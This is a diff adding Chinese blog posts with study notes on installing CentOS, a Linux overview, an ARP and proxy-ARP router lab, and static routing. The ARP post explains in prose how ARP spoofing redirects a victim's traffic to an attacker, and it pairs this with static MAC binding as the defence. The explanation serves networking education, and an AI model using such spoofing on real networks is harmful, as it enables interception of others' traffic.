@@ -199,6 +199,708 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/12/03/Linux-%E5%AE%89%E8%A3%85/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/03/Linux-%E5%AE%89%E8%A3%85/" class="post-title-link" itemprop="url">Linux 安装</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-03 11:35:34 / 修改时间：13:36:46" itemprop="dateCreated datePublished" datetime="2022-12-03T11:35:34+08:00">2022-12-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：下载"><a href="#一：下载" class="headerlink" title="一：下载"></a>一：下载</h1><h2 id="1-1-Linux-系统镜像下载"><a href="#1-1-Linux-系统镜像下载" class="headerlink" title="1.1 Linux 系统镜像下载"></a>1.1 Linux 系统镜像下载</h2><p>官方地址：<a target="_blank" rel="noopener" href="https://www.centos.org/">The CentOS Project</a></p>
+<h2 id="1-2-VMware-虚拟化平台下载"><a href="#1-2-VMware-虚拟化平台下载" class="headerlink" title="1.2 VMware 虚拟化平台下载"></a>1.2 VMware 虚拟化平台下载</h2><p>官方地址：<a target="_blank" rel="noopener" href="https://www.vmware.com/">VMware - Delivering a Digital Foundation For Businesses</a></p>
+<p>VMware WorkStation Pro：商用付费版本</p>
+<p>VMware WorkStation Player：个人免费版本</p>
+<h1 id="二：创建虚拟机"><a href="#二：创建虚拟机" class="headerlink" title="二：创建虚拟机"></a>二：创建虚拟机</h1><h2 id="2-1-CPU配置"><a href="#2-1-CPU配置" class="headerlink" title="2.1 CPU配置"></a>2.1 CPU配置</h2><ul>
+<li>处理器数量：对应CPU插槽数量；</li>
+<li>每个处理器的内核数量：一个CPU插槽上的CPU有几个处理核心；</li>
+</ul>
+<p>参考主机 任务管理器 参数设置：</p>
+<p><img src="/2022/12/03/Linux-%E5%AE%89%E8%A3%85/image-20221203120359609.png"></p>
+<ul>
+<li>逻辑处理器：每个CPU内核通过超线程技术，可以模拟出2个逻辑处理器。</li>
+</ul>
+<h2 id="2-2-网络连接方式"><a href="#2-2-网络连接方式" class="headerlink" title="2.2 网络连接方式"></a>2.2 网络连接方式</h2><ul>
+<li>桥接：将主机作为一个桥，使得创建的虚拟机与主机处于同等地位，共同连接同一个路由器下的网络。</li>
+<li>NAT：将主机看做一个虚拟机的路由器，虚拟机借助主机与外部网络连通。</li>
+</ul>
+<h1 id="三：安装CentOS系统"><a href="#三：安装CentOS系统" class="headerlink" title="三：安装CentOS系统"></a>三：安装CentOS系统</h1><h2 id="3-1-启用虚拟化"><a href="#3-1-启用虚拟化" class="headerlink" title="3.1 启用虚拟化"></a>3.1 启用虚拟化</h2><p>在BIOS中开启虚拟化；</p>
+<h2 id="3-2-挂载镜像"><a href="#3-2-挂载镜像" class="headerlink" title="3.2 挂载镜像"></a>3.2 挂载镜像</h2><p><img src="/2022/12/03/Linux-%E5%AE%89%E8%A3%85/image-20221203130557001.png"></p>
+<h2 id="3-3-磁盘分区"><a href="#3-3-磁盘分区" class="headerlink" title="3.3 磁盘分区"></a>3.3 磁盘分区</h2><ul>
+<li>创建引导分区：&#x2F;boot，必须位于该目录；1G即可；文件系统xfp；</li>
+</ul>
+<p>创建交换分区：swap，没有“&#x2F;”，单独设置硬盘的一块区域，作为一个扩展的内存。</p>
+<ul>
+<li>当内存用满的时候，我们此时还要开启另一个应用，内存会把当前未在使用的应用放入交换分区，空闲出空间，让我们启动新的应用，而不至于程序卡死。（虚拟内存）</li>
+<li>实际内存的1倍或者2倍</li>
+<li>文件系统：swap</li>
+</ul>
+<p>剩余空间分区：全部挂载至 “&#x2F;” 根目录下；</p>
+<img src="/2022/12/03/Linux-%E5%AE%89%E8%A3%85/image-20221203131342655.png">
+
+<h2 id="3-4-网络及主机名"><a href="#3-4-网络及主机名" class="headerlink" title="3.4 网络及主机名"></a>3.4 网络及主机名</h2><p>修改主机名称；</p>
+<p>开启以太网；</p>
+<img src="/2022/12/03/Linux-%E5%AE%89%E8%A3%85/image-20221203131443676.png">
+
+<h2 id="3-5-创建用户"><a href="#3-5-创建用户" class="headerlink" title="3.5 创建用户"></a>3.5 创建用户</h2><img src="/2022/12/03/Linux-%E5%AE%89%E8%A3%85/image-20221203131508491.png">
+
+<img src="/2022/12/03/Linux-%E5%AE%89%E8%A3%85/image-20221203131642696.png">
+
+<h1 id="四：开机测试"><a href="#四：开机测试" class="headerlink" title="四：开机测试"></a>四：开机测试</h1><h2 id="4-1-桌面"><a href="#4-1-桌面" class="headerlink" title="4.1 桌面"></a>4.1 桌面</h2><img src="/2022/12/03/Linux-%E5%AE%89%E8%A3%85/image-20221203133153586.png" style="zoom:67%;">
+
+<h2 id="4-2-网络"><a href="#4-2-网络" class="headerlink" title="4.2 网络"></a>4.2 网络</h2><img src="/2022/12/03/Linux-%E5%AE%89%E8%A3%85/image-20221203133337906.png" style="zoom:67%;">
+
+<p>至此，Linux 系统安装就完成了，网络连接也可以正常使用！</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/12/02/Linux-%E6%A6%82%E8%BF%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/02/Linux-%E6%A6%82%E8%BF%B0/" class="post-title-link" itemprop="url">Linux 概述</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-02 00:55:57 / 修改时间：01:18:28" itemprop="dateCreated datePublished" datetime="2022-12-02T00:55:57+08:00">2022-12-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：Linux-是什么？"><a href="#一：Linux-是什么？" class="headerlink" title="一：Linux 是什么？"></a>一：Linux 是什么？</h1><p>Linux 是一个操作系统（OS）</p>
+<img src="/2022/12/02/Linux-%E6%A6%82%E8%BF%B0/image-20221202010250119.png" style="zoom:50%;">
+
+<h1 id="二：Linux-的诞生"><a href="#二：Linux-的诞生" class="headerlink" title="二：Linux 的诞生"></a>二：Linux 的诞生</h1><img src="/2022/12/02/Linux-%E6%A6%82%E8%BF%B0/image-20221202010332476.png" style="zoom: 67%;">
+
+<h1 id="三：Linux-与-Unix-的渊源"><a href="#三：Linux-与-Unix-的渊源" class="headerlink" title="三：Linux 与 Unix 的渊源"></a>三：Linux 与 Unix 的渊源</h1><p><img src="/2022/12/02/Linux-%E6%A6%82%E8%BF%B0/image-20221202010434500.png"></p>
+<ul>
+<li>Dennis Ritchie：开发了C语言；</li>
+<li>Linus Torvalds：开发了 Git 工具；</li>
+<li>FreeBSD：开源协议限制较少，不要求需要全部公开源码，便于商业使用，Mac OS 系统也基于其开发而成。</li>
+</ul>
+<h1 id="四：GUN-x2F-Linux"><a href="#四：GUN-x2F-Linux" class="headerlink" title="四：GUN&#x2F;Linux"></a>四：GUN&#x2F;Linux</h1><img src="/2022/12/02/Linux-%E6%A6%82%E8%BF%B0/image-20221202011012214.png" style="zoom:67%;">
+
+<ul>
+<li>Richard Stallman：黑客大神，自由软件开拓者，GNU协议发起者与倡导者；GUN协议要求，基于其开发的应用程序都要公布源代码，用户友好性。</li>
+<li>Linus Torvalds 写的是 Linux 的内核，内核搭配上外围应用（GUN提供）组成一个完整的操作系统。</li>
+</ul>
+<h1 id="五：Linux-发行版本"><a href="#五：Linux-发行版本" class="headerlink" title="五：Linux 发行版本"></a>五：Linux 发行版本</h1><img src="/2022/12/02/Linux-%E6%A6%82%E8%BF%B0/image-20221202011436019.png" style="zoom:80%;">
+
+<h1 id="六：Linux-VS-Windows"><a href="#六：Linux-VS-Windows" class="headerlink" title="六：Linux VS Windows"></a>六：Linux VS Windows</h1><p><img src="/2022/12/02/Linux-%E6%A6%82%E8%BF%B0/image-20221202011609137.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/12/01/ARP-%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/01/ARP-%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">ARP 协议</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-12-01 12:17:04" itemprop="dateCreated datePublished" datetime="2022-12-01T12:17:04+08:00">2022-12-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-02 09:12:22" itemprop="dateModified" datetime="2022-12-02T09:12:22+08:00">2022-12-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%80%9D%E7%A7%91CCNA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">思科CCNA网络基础入门</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：概念"><a href="#一：概念" class="headerlink" title="一：概念"></a>一：概念</h1><ul>
+<li>ARP：address resolution protocol，地址解析协议</li>
+<li>作用：将已知的IP地址解析为MAC地址</li>
+</ul>
+<h1 id="二：实验"><a href="#二：实验" class="headerlink" title="二：实验"></a>二：实验</h1><img src="/2022/12/01/ARP-%E5%8D%8F%E8%AE%AE/image-20221201133858284.png" style="zoom:50%;">
+
+<h2 id="2-1-对首次ping进行抓包"><a href="#2-1-对首次ping进行抓包" class="headerlink" title="2.1 对首次ping进行抓包"></a>2.1 对首次ping进行抓包</h2><h3 id="（1）路由器R1"><a href="#（1）路由器R1" class="headerlink" title="（1）路由器R1"></a>（1）路由器R1</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show ip interface brief </span></span><br><span class="line">Interface                  IP-Address      OK? Method Status                Protocol</span><br><span class="line">GigabitEthernet0/0         192.168.1.1     YES manual up                    up      </span><br><span class="line">GigabitEthernet0/1         unassigned      YES <span class="built_in">unset</span>  administratively down down    </span><br><span class="line">GigabitEthernet0/2         unassigned      YES <span class="built_in">unset</span>  administratively down down    </span><br><span class="line">GigabitEthernet0/3         unassigned      YES <span class="built_in">unset</span>  administratively down down </span><br><span class="line"></span><br><span class="line">Router<span class="comment">#ping 192.168.1.3</span></span><br><span class="line">Type escape sequence to abort.</span><br><span class="line">Sending 5, 100-byte ICMP Echos to 192.168.1.3, <span class="built_in">timeout</span> is 2 seconds:</span><br><span class="line">.!!!!</span><br><span class="line">Success rate is 80 percent (4/5), round-trip min/avg/max = 2/2/4 ms</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）路由器R2"><a href="#（2）路由器R2" class="headerlink" title="（2）路由器R2"></a>（2）路由器R2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show ip interface brief </span></span><br><span class="line">Interface                  IP-Address      OK? Method Status                Protocol</span><br><span class="line">GigabitEthernet0/0         192.168.1.3     YES manual up                    up      </span><br><span class="line">GigabitEthernet0/1         unassigned      YES <span class="built_in">unset</span>  administratively down down    </span><br><span class="line">GigabitEthernet0/2         unassigned      YES <span class="built_in">unset</span>  administratively down down    </span><br><span class="line">GigabitEthernet0/3         unassigned      YES <span class="built_in">unset</span>  administratively down down</span><br></pre></td></tr></table></figure>
+
+<h3 id="（3）使用-wireshark-进行抓包"><a href="#（3）使用-wireshark-进行抓包" class="headerlink" title="（3）使用 wireshark 进行抓包"></a>（3）使用 wireshark 进行抓包</h3><p><img src="/2022/12/01/ARP-%E5%8D%8F%E8%AE%AE/image-20221201133530514.png"></p>
+<p>由抓包结果进行分析，首次的Ping发送了一个ARP广播；192.168.1.3 接收到后保存了发送方的Mac地址，并做出了单播响应，告知了对方自己的Mac地址。因此，此后的5次PING命令，分别抓到发送和响应8个ICMP包。</p>
+<h2 id="2-2-查看-ARP"><a href="#2-2-查看-ARP" class="headerlink" title="2.2 查看 ARP"></a>2.2 查看 ARP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show arp</span></span><br><span class="line">Protocol  Address          Age (min)  Hardware Addr   Type   Interface</span><br><span class="line">Internet  192.168.1.1             -   5061.e800.1400  ARPA   GigabitEthernet0/0</span><br><span class="line">Internet  192.168.1.2            27   50ea.cd00.1500  ARPA   GigabitEthernet0/0</span><br><span class="line">Internet  192.168.1.3            12   50ea.cd00.1500  ARPA   GigabitEthernet0/0</span><br></pre></td></tr></table></figure>
+
+<p>以太网的头部，每经过一个路由器都会从新编写一个新的头部，修改源MAC和目的MAC。</p>
+<h1 id="三：代理-ARP"><a href="#三：代理-ARP" class="headerlink" title="三：代理 ARP"></a>三：代理 ARP</h1><h2 id="3-1-概念"><a href="#3-1-概念" class="headerlink" title="3.1 概念"></a>3.1 概念</h2><p>代理ARP（proxy arp）：通常就是一个主机（路由器），作为指定的设备（路由器代替该设备）对另一台设备的APR请求做出响应。</p>
+<h2 id="3-2-实例"><a href="#3-2-实例" class="headerlink" title="3.2 实例"></a>3.2 实例</h2><img src="/2022/12/01/ARP-%E5%8D%8F%E8%AE%AE/image-20221201153651270.png" style="zoom:50%;">
+
+<h3 id="（1）R1-路由"><a href="#（1）R1-路由" class="headerlink" title="（1）R1 路由"></a>（1）R1 路由</h3><p>通过出接口方式，将数据包通过Gi0&#x2F;0接口发送出去；路由表新增一条静态路由；</p>
+<p>通过 wireshark 抓包情况，发现若不配置出接口，数据将因无法定位到目标MAC而在路由器内部发不出去。</p>
+<p>当配置出接口后，首次PING进行广播，获取到目标设备的MAC地址，wireshark 抓取到 8次通信数据包。</p>
+<p>由此，R1和R2路由互通。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># R1: 通过出接口方式配置路由</span></span><br><span class="line">ip route 192.168.1.0 255.255.255.0 Gi0/0 </span><br><span class="line"></span><br><span class="line">Router<span class="comment">#show ip route</span></span><br><span class="line">Codes: L - <span class="built_in">local</span>, C - connected, S - static, R - RIP, M - mobile, B - BGP</span><br><span class="line">       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area </span><br><span class="line">       N1 - OSPF NSSA external <span class="built_in">type</span> 1, N2 - OSPF NSSA external <span class="built_in">type</span> 2</span><br><span class="line">       E1 - OSPF external <span class="built_in">type</span> 1, E2 - OSPF external <span class="built_in">type</span> 2</span><br><span class="line">       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2</span><br><span class="line">       ia - IS-IS inter area, * - candidate default, U - per-user static route</span><br><span class="line">       o - ODR, P - periodic downloaded static route, H - NHRP, l - LISP</span><br><span class="line">       a - application route</span><br><span class="line">       + - replicated route, % - next hop override, p - overrides from PfR</span><br><span class="line"></span><br><span class="line">Gateway of last resort is not <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">      192.168.0.0/24 is variably subnetted, 2 subnets, 2 masks</span><br><span class="line">C        192.168.0.0/24 is directly connected, GigabitEthernet0/0</span><br><span class="line">L        192.168.0.1/32 is directly connected, GigabitEthernet0/0</span><br><span class="line">S     192.168.1.0/24 is directly connected, GigabitEthernet0/0</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）R2-路由"><a href="#（2）R2-路由" class="headerlink" title="（2）R2 路由"></a>（2）R2 路由</h3><p>仅仅配置了2个接口的IP地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show ip route</span></span><br><span class="line">Codes: L - <span class="built_in">local</span>, C - connected, S - static, R - RIP, M - mobile, B - BGP</span><br><span class="line">       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area </span><br><span class="line">       N1 - OSPF NSSA external <span class="built_in">type</span> 1, N2 - OSPF NSSA external <span class="built_in">type</span> 2</span><br><span class="line">       E1 - OSPF external <span class="built_in">type</span> 1, E2 - OSPF external <span class="built_in">type</span> 2</span><br><span class="line">       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2</span><br><span class="line">       ia - IS-IS inter area, * - candidate default, U - per-user static route</span><br><span class="line">       o - ODR, P - periodic downloaded static route, H - NHRP, l - LISP</span><br><span class="line">       a - application route</span><br><span class="line">       + - replicated route, % - next hop override, p - overrides from PfR</span><br><span class="line"></span><br><span class="line">Gateway of last resort is not <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">      192.168.0.0/24 is variably subnetted, 2 subnets, 2 masks</span><br><span class="line">C        192.168.0.0/24 is directly connected, GigabitEthernet0/0</span><br><span class="line">L        192.168.0.2/32 is directly connected, GigabitEthernet0/0</span><br><span class="line">      192.168.1.0/24 is variably subnetted, 2 subnets, 2 masks</span><br><span class="line">C        192.168.1.0/24 is directly connected, GigabitEthernet0/1</span><br><span class="line">L        192.168.1.2/32 is directly connected, GigabitEthernet0/1</span><br></pre></td></tr></table></figure>
+
+<p>配置R2路由，关于1网段的出接口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)<span class="comment">#ip route 192.168.1.0 255.255.255.0 Gi0/1</span></span><br></pre></td></tr></table></figure>
+
+<p>此时，若要从R1向R3发送数据包，通过 wireshark 抓包分析，数据包成功发送出去，却没有响应，所以此时，我们应该配置R3路由通往0网段的出接口。</p>
+<h3 id="（3）R3-路由"><a href="#（3）R3-路由" class="headerlink" title="（3）R3 路由"></a>（3）R3 路由</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)<span class="comment">#ip route 192.168.0.0 255.255.255.0 Gi0/0</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router&gt;ping 192.168.0.1</span><br><span class="line">Type escape sequence to abort.</span><br><span class="line">Sending 5, 100-byte ICMP Echos to 192.168.0.1, <span class="built_in">timeout</span> is 2 seconds:</span><br><span class="line">!!!!!</span><br><span class="line">Success rate is 100 percent (5/5), round-trip min/avg/max = 3/4/7 ms</span><br></pre></td></tr></table></figure>
+
+<p>此时可以观察到R1路由与R3路由实现了互通。</p>
+<h2 id="3-3-ARP-变化"><a href="#3-3-ARP-变化" class="headerlink" title="3.3 ARP 变化"></a>3.3 ARP 变化</h2><p>当我们R1与R3未进行通信时，此时R3的ARP表的情况是这样的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show ip arp</span></span><br><span class="line">Protocol  Address          Age (min)  Hardware Addr   Type   Interface</span><br><span class="line">Internet  192.168.1.2            62   506e.b500.1701  ARPA   GigabitEthernet0/0</span><br><span class="line">Internet  192.168.1.3             -   502e.cd00.1800  ARPA   GigabitEthernet0/0</span><br></pre></td></tr></table></figure>
+
+<p>当完成上述实例通信时，两者互通，此时查看R3的ARP表如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show ip arp</span></span><br><span class="line">Protocol  Address          Age (min)  Hardware Addr   Type   Interface</span><br><span class="line">Internet  192.168.0.1             1   506e.b500.1701  ARPA   GigabitEthernet0/0</span><br><span class="line">Internet  192.168.1.2            65   506e.b500.1701  ARPA   GigabitEthernet0/0</span><br><span class="line">Internet  192.168.1.3             -   502e.cd00.1800  ARPA   GigabitEthernet0/0</span><br></pre></td></tr></table></figure>
+
+<p>由上述两表观察可知，R1路由的地址被存储在了R3的ARP表中，且因为有存活时间，更值得注意的是此处用到了 APR代理，代理地址即为我们的R2路由。因此此处由于设计本身的缺陷，存在漏洞，故而当代理ARP进行广播请求时，我们可以冒充网关（被攻击机的下一跳地址），给被攻击机做出单播响应，这样被攻击机就会存储攻击机的MAC地址，下次发送数据就会发送给攻击机，被攻击方可以直观的感受到不能上网（地址冲突），或者网络请求超时等。</p>
+<p><img src="/2022/12/01/ARP-%E5%8D%8F%E8%AE%AE/image-20221202090929264.png"></p>
+<h1 id="四：总结"><a href="#四：总结" class="headerlink" title="四：总结"></a>四：总结</h1><ul>
+<li>APR 后到优先，当下一跳存在2台路由器时，广播响应会被两台路由都响应，后者会将前者的响应覆盖，可能会导致我们的路由寻址不是最优路径；</li>
+<li>只写出接口的静态路由会依赖代理ARP，若关闭代理ARP则不能实现通信； </li>
+<li>代理ARP 会产生大量ARP映射列表，这些数据会占用内存；</li>
+<li>最好的静态路由写法就是既有出接口，又有下一跳；</li>
+<li>仅写下一跳会触发自身的递归查询；</li>
+<li>ARP攻击：由于自身广播请求，所以请求的目的IP会被当前广播域内，所有的主机听到；若此时，黑客伪装自己的IP地址，就是我们请求的地址，再回访我们一次；即使我们之前请求到了真的服务器地址，但由于ARP本身后到优先的机制，黑客的地址会覆盖之前真正服务器的地址；我们的ARP映射列表中存储了黑客电脑的MAC，此时发送消息，我们就把数据全部发送到了黑客的电脑。</li>
+<li>防止ARP攻击：人为手动绑定MAC地址，arp IP address MAC address arpa；ARP映射表中就有了对方的MAC，无法被后到优先覆盖，防止被ARP欺骗。</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/12/01/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/01/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">静态路由协议</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-01 09:19:43 / 修改时间：12:15:02" itemprop="dateCreated datePublished" datetime="2022-12-01T09:19:43+08:00">2022-12-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%80%9D%E7%A7%91CCNA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">思科CCNA网络基础入门</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><ul>
+<li>一个小型到中型的网络适合静态路由，而且没有或只有较小的扩充计划时。</li>
+<li>静态路由需要手工输入、手工管理；管理开销对于动态路由来说是一个大大的负担。</li>
+</ul>
+<h1 id="二：优缺点"><a href="#二：优缺点" class="headerlink" title="二：优缺点"></a>二：优缺点</h1><ul>
+<li>优点：<ul>
+<li>对路由器CPU没有管理开销</li>
+<li>在路由器间没有宽带占用</li>
+<li>增加安全性</li>
+</ul>
+</li>
+<li>缺点：<ul>
+<li>必须真正的了解网络</li>
+<li>对于新添加网络配置繁琐</li>
+<li>对于大型网络工作量巨大</li>
+</ul>
+</li>
+</ul>
+<h1 id="三：静态路由配置"><a href="#三：静态路由配置" class="headerlink" title="三：静态路由配置"></a>三：静态路由配置</h1><ul>
+<li>配置命令<ul>
+<li>ip route newwork-address subnet-mask { ip-add | exit-interface } </li>
+<li>ip route 192.168.1.0 255.255.255.0 192.168.12.2</li>
+<li>ip route 192.168.1.0 255.255.255.0 serial 0</li>
+</ul>
+</li>
+<li>查看路由表<ul>
+<li>show ip route</li>
+<li>do show ip route</li>
+</ul>
+</li>
+</ul>
